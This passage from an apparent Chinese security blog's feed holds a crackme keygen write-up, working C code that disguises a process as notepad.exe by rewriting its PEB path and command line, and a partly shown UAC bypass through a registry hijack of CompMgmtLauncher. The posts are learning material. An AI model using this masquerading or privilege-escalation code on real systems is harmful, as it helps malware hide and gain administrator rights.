    <summary type="html">&lt;h3 id=&quot;shellcode学习&quot;&gt;&lt;a href=&quot;#shellcode学习&quot; class=&quot;headerlink&quot; title=&quot;shellcode学习&quot;&gt;&lt;/a&gt;shellcode学习&lt;/h3&gt;&lt;h4 id=&quot;编译器的一些设置&quot;&gt;&lt;a href=&quot;#编译器的一些设置&quot;</summary>
      
    
    
    
    <category term="ShellCode" scheme="https://b1ack1e.github.io/categories/ShellCode/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="ShellCode" scheme="https://b1ack1e.github.io/tags/ShellCode/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-003</title>
    <link href="https://b1ack1e.github.io/2021/07/21/160CrackMe-003/"/>
    <id>https://b1ack1e.github.io/2021/07/21/160CrackMe-003/</id>
    <published>2021-07-21T07:11:38.000Z</published>
    <updated>2021-07-21T10:41:29.824Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序看到需要输入用户名和序列号尝试输入后提示错误</p><p><img src="/2021/07/21/160CrackMe-003/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用工具查看，发现未加壳，语言是VB。</p><p><img src="/2021/07/21/160CrackMe-003/2.png"></p><p>用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">004081E3   .  FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  Msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004081E9   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</span><br><span class="line">004081EF   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  获取输入的name</span><br><span class="line">004081F2   .  50            push eax                                 ; /String = 00004000 ???</span><br><span class="line">004081F3   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</span><br><span class="line">004081F5   .  FF15 F8B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \获取name长度</span><br><span class="line">004081FB   .  8BF8          mov edi,eax</span><br><span class="line">004081FD   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]</span><br><span class="line">00408200   .  69FF 385B0100 imul edi,edi,0x15B38                     ;  长度乘以0x15B38</span><br><span class="line">00408206   .  51            push ecx                                 ; /String = 091C840A ???</span><br><span class="line">00408207   .  0F80 B7050000 jo AfKayAs_.004087C4                     ; |</span><br><span class="line">0040820D   .  FF15 0CB14000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]     ; \获取输入name的第一次ascii码</span><br><span class="line">00408213   .  0FBFD0        movsx edx,ax</span><br><span class="line">00408216   .  03FA          add edi,edx                              ;  长度计算后加上name[0]</span><br><span class="line">00408218   .  0F80 A6050000 jo AfKayAs_.004087C4</span><br><span class="line">0040821E   .  57            push edi                                 ;  Msvbvm50.__vbaObjSet</span><br><span class="line">0040821F   .  FF15 F4B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  转字符串（十进制）</span><br></pre></td></tr></table></figure><p>然后将结果转为浮点数执行了几次操作。</p><p>第一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">004082E9   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  转为浮点数</span><br><span class="line">004082EF   .  D905 08104000 fld dword ptr ds:[0x401008]              ;  １０</span><br><span class="line">004082F5   .  833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0</span><br><span class="line">004082FC   .  75 08         jnz short AfKayAs_.00408306</span><br><span class="line">004082FE   .  D835 0C104000 fdiv dword ptr ds:[0x40100C]             ;  １０／５</span><br><span class="line">00408304   .  EB 0B         jmp short AfKayAs_.00408311</span><br><span class="line">00408306   &gt;  FF35 0C104000 push dword ptr ds:[0x40100C]</span><br><span class="line">0040830C   .  E8 578DFFFF   call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;</span><br><span class="line">00408311   &gt;  83EC 08       sub esp,0x8</span><br><span class="line">00408314   .  DFE0          fstsw ax</span><br><span class="line">00408316   .  A8 0D         test al,0xD</span><br><span class="line">00408318   .  0F85 A1040000 jnz AfKayAs_.004087BF</span><br><span class="line">0040831E   .  DEC1          faddp st(1),st                           ;  ＋２</span><br><span class="line">00408320   .  DFE0          fstsw ax</span><br><span class="line">00408322   .  A8 0D         test al,0xD</span><br><span class="line">00408324   .  0F85 95040000 jnz AfKayAs_.004087BF</span><br><span class="line">0040832A   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">0040832D   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  转回去</span><br></pre></td></tr></table></figure><p>第二次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">004083F5   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  Msvbvm50.__vbaR8Str</span><br><span class="line">004083FB   .  DC0D 10104000 fmul qword ptr ds:[0x401010]             ;  ＊３</span><br><span class="line">00408401   .  83EC 08       sub esp,0x8</span><br><span class="line">00408404   .  DC25 18104000 fsub qword ptr ds:[0x401018]             ;  －２</span><br><span class="line">0040840A   .  DFE0          fstsw ax</span><br><span class="line">0040840C   .  A8 0D         test al,0xD</span><br><span class="line">0040840E   .  0F85 AB030000 jnz AfKayAs_.004087BF</span><br><span class="line">00408414   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">00408417   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  Msvbvm50.__vbaStrR8</span><br></pre></td></tr></table></figure><p>第三次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004084DF   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  Msvbvm50.__vbaR8Str</span><br><span class="line">004084E5   .  DC25 20104000 fsub qword ptr ds:[0x401020]             ;  ＋１５</span><br><span class="line">004084EB   .  83EC 08       sub esp,0x8</span><br><span class="line">004084EE   .  DFE0          fstsw ax</span><br><span class="line">004084F0   .  A8 0D         test al,0xD</span><br><span class="line">004084F2   .  0F85 C7020000 jnz AfKayAs_.004087BF</span><br><span class="line">004084F8   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">004084FB   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  Msvbvm50.__vbaStrR8</span><br></pre></td></tr></table></figure><p>最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">004085F1   .  DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4]            ;  计算的ｓｅｒｉａｌ／输入</span><br><span class="line">004085F7   .  EB 11         jmp short AfKayAs_.0040860A</span><br><span class="line">004085F9   &gt;  FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0]</span><br><span class="line">004085FF   .  FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4]</span><br><span class="line">00408605   .  E8 888AFFFF   call &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;</span><br><span class="line">0040860A   &gt;  DFE0          fstsw ax</span><br><span class="line">0040860C   .  A8 0D         test al,0xD</span><br><span class="line">0040860E   .  0F85 AB010000 jnz AfKayAs_.004087BF</span><br><span class="line">00408614   .  FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;;  Msvbvm50.__vbaFpR8</span><br><span class="line">0040861A   .  DC1D 28104000 fcomp qword ptr ds:[0x401028]            ;  结果与１进行比较</span><br><span class="line">00408620   .  DFE0          fstsw ax                                 ;  将寄存器的值传给ＡＸ</span><br><span class="line">00408622   .  F6C4 40       test ah,0x40                             ;  比较ａｈ值与０ｘ４０</span><br><span class="line">00408625   .  74 07         je short AfKayAs_.0040862E               ;  若不相等就会跳到清空ｅｓｉ处</span><br><span class="line">00408627   .  BE 01000000   mov esi,0x1                              ;  相等ｅｓｉ赋值１</span><br><span class="line">0040862C   .  EB 02         jmp short AfKayAs_.00408630</span><br><span class="line">0040862E   &gt;  33F6          xor esi,esi                              ;  清空寄存器</span><br></pre></td></tr></table></figure><p>这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax</p><table><thead><tr><th>比较结果</th><th>C3</th><th>C0</th></tr></thead><tbody><tr><td>ST(0)&gt;源操作数</td><td>0</td><td>0</td></tr><tr><td>ST(0)&lt;源操作数</td><td>0</td><td>1</td></tr><tr><td>ST(0)=源操作数</td><td>1</td><td>0</td></tr><tr><td>ST(0)不可比较</td><td>1</td><td>1</td></tr></tbody></table><p>看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1</p><p><img src="/2021/07/21/160CrackMe-003/3.png"></p><p>计算器转换一下看的仔细</p><p><img src="/2021/07/21/160CrackMe-003/4.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入name\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    gets_s(name, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(name);</span><br><span class="line">    <span class="keyword">int</span> serial;</span><br><span class="line">    serial = len * <span class="number">0x15B38</span>;</span><br><span class="line">    serial += name[<span class="number">0</span>];</span><br><span class="line">    serial = (serial + <span class="number">2</span>) * <span class="number">3</span> - <span class="number">2</span> + <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;serial:%d\n&quot;</span>, serial);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/21/160CrackMe-003/5.png"></p><p>输入正确的serial</p><p><img src="/2021/07/21/160CrackMe-003/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序看到需要输入用户名和序列号尝试输入后提示错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/21/160CrackMe-003</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>隐藏技术-进程伪装</title>
    <link href="https://b1ack1e.github.io/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/"/>
    <id>https://b1ack1e.github.io/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/</id>
    <published>2021-07-21T06:02:59.000Z</published>
    <updated>2021-07-27T08:46:06.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h4><p>进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。</p><p>查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/1.png"></p><p>继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\Windows\system32\notepad.exe”</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/2.png"></p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><ul><li>获取PEB地址</li><li>获取ProcessParameters</li><li>写入伪装信息</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* typedef_NtQueryInformationProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">IN ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*PID：需要进行伪装的进程PID</span></span><br><span class="line"><span class="comment">* lpwszpath：伪装路径</span></span><br><span class="line"><span class="comment">* lpwszcmd：伪装命令行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">DisguiseProcess</span><span class="params">(DWORD PID, <span class="keyword">wchar_t</span>* lpwszPath, <span class="keyword">wchar_t</span>* lpwszCmd)</span> </span>&#123;</span><br><span class="line"><span class="comment">//打开进程获取句柄</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">typedef_NtQueryInformationProcess NtQueryInformationProcess = <span class="literal">NULL</span>;</span><br><span class="line">PROCESS_BASIC_INFORMATION pbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PEB peb = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RTL_USER_PROCESS_PARAMETERS Param = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">USHORT usCmdLen = <span class="number">0</span>;</span><br><span class="line">USHORT usPathLen = <span class="number">0</span>;</span><br><span class="line">NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQueryInformationProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取函数地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, <span class="keyword">sizeof</span>(pbi), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取进程信息失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取peb的地址</span></span><br><span class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//获取ProcessParameters地址</span></span><br><span class="line">ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, <span class="keyword">sizeof</span>(Param), <span class="literal">NULL</span>);</span><br><span class="line">usCmdLen = <span class="number">2</span> + <span class="number">2</span> * wcslen(lpwszCmd);</span><br><span class="line"><span class="comment">//写入命令行信息</span></span><br><span class="line">WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, <span class="literal">NULL</span>);</span><br><span class="line">WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, <span class="keyword">sizeof</span>(usCmdLen), <span class="literal">NULL</span>);</span><br><span class="line">usPathLen = <span class="number">2</span> + <span class="number">2</span> * wcslen(lpwszPath);</span><br><span class="line"><span class="comment">//写入路径信息</span></span><br><span class="line">WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, <span class="literal">NULL</span>);</span><br><span class="line">WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, <span class="keyword">sizeof</span>(usPathLen), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID </span></span><br><span class="line"><span class="keyword">if</span> (DisguiseProcess(_getpid(), <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="string">L&quot;C:\\Windows\\Syetem32\\notepad.exe&quot;</span>) == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;进程伪装失败\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;伪装成功\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行伪装程序，提示伪装成功</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/3.png"></p><p>然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;进程伪装&quot;&gt;&lt;a href=&quot;#进程伪装&quot; class=&quot;headerlink&quot; title=&quot;进程伪装&quot;&gt;&lt;/a&gt;进程伪装&lt;/h4&gt;&lt;p&gt;进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。&lt;/p&gt;
&lt;h4 i</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="隐藏技术" scheme="https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>提权技术-Bypass UAC</title>
    <link href="https://b1ack1e.github.io/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/"/>
    <id>https://b1ack1e.github.io/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/</id>
    <published>2021-07-20T06:24:40.000Z</published>
    <updated>2021-07-27T08:46:01.758Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>UAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。</p><p>正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/1.png"></p><p>在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>下面拿白名单程序CompMgmtLauncher来进行一下分析。</p><h4 id="分析CompMgmtLauncher启动过程"><a href="#分析CompMgmtLauncher启动过程" class="headerlink" title="分析CompMgmtLauncher启动过程"></a>分析CompMgmtLauncher启动过程</h4><p>打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\Software\Classes\mscfile\shell\open\command中的值。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/2.png"></p><p>可以看一下，此路径中存在什么，可以看到其中没有值</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/3.png"></p><p>如果该路径没有值，然后就会查询HKCR\mscfile\shell\open\command，查看其中的值，存储这mmc.exe进程的路径信息。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/4.png"></p><p>现在可以知道，当它启动时，会先查看HKCU\Software\Classes\mscfile\shell\open\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。</p><p>现在就修改注册表信息，在HKCU\Software\Classes\mscfile\shell\open\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    PVOID OldValue = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//关闭重定位</span></span><br><span class="line">    <span class="built_in">Wow64DisableWow64FsRedirection</span>(&amp;OldValue);</span><br><span class="line">    HKEY hKey = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hKey == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建键值失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, 